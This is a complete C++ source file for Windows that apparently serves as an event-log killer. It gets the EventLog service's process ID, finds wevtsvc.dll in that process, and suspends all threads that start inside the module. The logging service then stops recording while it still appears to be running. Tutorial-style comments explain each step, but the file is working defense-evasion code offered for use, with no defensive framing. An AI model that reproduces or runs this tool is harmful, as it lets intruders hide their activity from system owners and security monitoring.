#include <iostream>
#include <vector>
#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>

#pragma comment(lib, "DbgHelp")

typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadTimes = 1,
    ThreadPriority = 2,
    ThreadBasePriority = 3,
    ThreadAffinityMask = 4,
    ThreadImpersonationToken = 5,
    ThreadDescriptorTableEntry = 6,
    ThreadEnableAlignmentFaultFixup = 7,
    ThreadEventPair = 8,
    ThreadQuerySetWin32StartAddress = 9,   //key importance, remember this
    ThreadZeroTlsCell = 10,
    ThreadPerformanceCount = 11,
    ThreadAmILastThread = 12
} THREADINFOCLASS;

using NtQueryInformationThread_t = NTSTATUS(NTAPI*)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG); // defines a function pointer, called later

DWORD GetEventLogServicePID() {
    SC_HANDLE scManager = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT); // retrieve handle to service manager
    if (!scManager) {
        DWORD error = GetLastError();
        std::cerr << "Failed to open Service Control Manager, error code : " << error << std::endl;
        return 0;
    }
    std::cout << "[i] Service Control Manager handle retrieved..." << std::endl;

    SC_HANDLE service = OpenServiceA(scManager, "EventLog", SERVICE_QUERY_STATUS); // retrieve handle to eventlog service running within the service manager
    if (!service) {
        DWORD error = GetLastError();
        std::cerr << "Failed to open EventLog service, error code : " << error << std::endl;
        CloseServiceHandle(scManager);
        return 0;
    }
    std::cout << "[i] EventLog service handle retrieved..." << std::endl;


    SERVICE_STATUS_PROCESS serviceStatus;  
    DWORD bytesNeeded;
    if (!QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatus, sizeof(serviceStatus), &bytesNeeded)) { // save service status to serviceStatus
        DWORD error = GetLastError();
        std::cerr << "Failed to query service status, error code : " << error << std::endl;
        CloseServiceHandle(service);
        CloseServiceHandle(scManager);
        return 0;
    }

    CloseServiceHandle(service);
    CloseServiceHandle(scManager);
    return serviceStatus.dwProcessId; // we saved the status of the service to the serviceStatus variable and from there we can pull the eventlog PID
}


MODULEINFO GetWevtsvcModuleInfo(HANDLE process) {
    std::vector<HMODULE> modules(1024); // create a vector to store module handles, dynamic array storing up to 1024 module handles
    DWORD needed; //bytes needed to hold all of them

    if (!EnumProcessModules(process, modules.data(), (DWORD)(modules.size() * sizeof(HMODULE)), &needed)) { // get all loaded dlls in the process
        std::cerr << "Failed to enumerate process modules.\n"; //
        return {};
    }

    size_t moduleCount = needed / sizeof(HMODULE); // dividing the total amount of bytes by the size of a single module gives us the amount of modules
    WCHAR moduleName[MAX_PATH]; // buffer to store module name

    for (size_t i = 0; i < moduleCount; ++i) { // iterate through modules
        if (GetModuleBaseNameW(process, modules[i], moduleName, MAX_PATH) > 0) { // retrieve the current name of the module in iteration
            if (wcscmp(moduleName, L"wevtsvc.dll") == 0) { 
                MODULEINFO moduleInfo; // to store the module info if a match is found 
                GetModuleInformation(process, modules[i], &moduleInfo, sizeof(moduleInfo)); // at this point the current iteration is the wevtsvc.dll, in this line we retrieve the module info and save it to moduleInfo
                std::wcout << L"[i] Found wevtsvc.dll at " << moduleInfo.lpBaseOfDll << L"\n";
                return moduleInfo;
            }
        }
    }

    std::cerr << "wevtsvc.dll not found.\n";
    return {};
}

void SuspendEventLogThreads(DWORD servicePID, MODULEINFO moduleInfo) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); //snapshot of all threads in system
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create thread snapshot\n";
        return;
    }

    HMODULE baseLibrary = GetModuleHandleA("ntdll"); // retrieve ntdll.dll handle
    if (!baseLibrary) {
        std::cerr << "failed to load the ntdll" << std::endl;
        return;
    }

    std::cout << "[i] NTDLL.dll module loaded correctly" << std::endl;

    NtQueryInformationThread_t NtQueryInformationThread = (NtQueryInformationThread_t)GetProcAddress(baseLibrary, "NtQueryInformationThread"); // find address of ntqueryinformationthread
    if (!NtQueryInformationThread) {
        std::cerr << "Failed to load NtQueryInformationThread function\n";
        CloseHandle(snapshot);
        return;
    }

    

    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == servicePID) { 
                HANDLE threadHandle = OpenThread(THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, FALSE, threadEntry.th32ThreadID); // if a thread is found with a PPID matching our EventLog PID,
                if (!threadHandle) continue; // generic error handling in a fascinating case where we cant create a threa
                                             // if we fail to  create a thread we continue iterating



                /*   the following part may be a big confusing
                     simply explained - we first retrieve the start address of the found thread using NtQueryInformationThread
                     then we perform bounds checking to see whether the start address of the thread is :
                     1. equal or bigger than the base address of wevtsvc.dll in memory  

                     threadStartAddress >= (DWORD_PTR)moduleInfo.lpBaseOfDll

                     2. and at the same time (&&) that its not beyond the end of the base address of wevtsvc.dll in memory

                     threadStartAddress < (DWORD_PTR)moduleInfo.lpBaseOfDll + moduleInfo.SizeOfImage)
                     
                     this is a more complex way of looking for threads belonging to a .dll
                */ 
                DWORD_PTR threadStartAddress = 0;
                if (NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(threadStartAddress), nullptr) == 0) { // key importance mentioned at the beggining :D  (THREADINFOCLASS)0x9 simply specifies "Give me the start address of this thread"
                    if (threadStartAddress >= (DWORD_PTR)moduleInfo.lpBaseOfDll &&
                        threadStartAddress < (DWORD_PTR)moduleInfo.lpBaseOfDll + moduleInfo.SizeOfImage) {
                        std::cout << "[!] Suspending thread ID: " << threadEntry.th32ThreadID << " at address: " << (void*)threadStartAddress << "\n";
                        SuspendThread(threadHandle);
                    }
                }
                CloseHandle(threadHandle);
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    CloseHandle(snapshot);
}

int main() {
    DWORD servicePID = GetEventLogServicePID(); // call func
    if (servicePID == 0) {
        std::cerr << "could not get EventLog service PID\n";
        return EXIT_FAILURE;
    }

    HANDLE serviceProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, servicePID); // retrieve eventlog function
    if (!serviceProcess) {
        DWORD error = GetLastError();
        std::cerr << "failed to open EventLog service process, error code : " << error << std::endl;
        return EXIT_FAILURE;
    }

    MODULEINFO wevtsvcModule = GetWevtsvcModuleInfo(serviceProcess); // retrieve wevtsvcmodule information
    if (wevtsvcModule.lpBaseOfDll == nullptr) {
        CloseHandle(serviceProcess);
        return EXIT_FAILURE;
    }

    SuspendEventLogThreads(servicePID, wevtsvcModule); // main suspend function

    CloseHandle(serviceProcess); //cleanupä
    return EXIT_SUCCESS; 
}
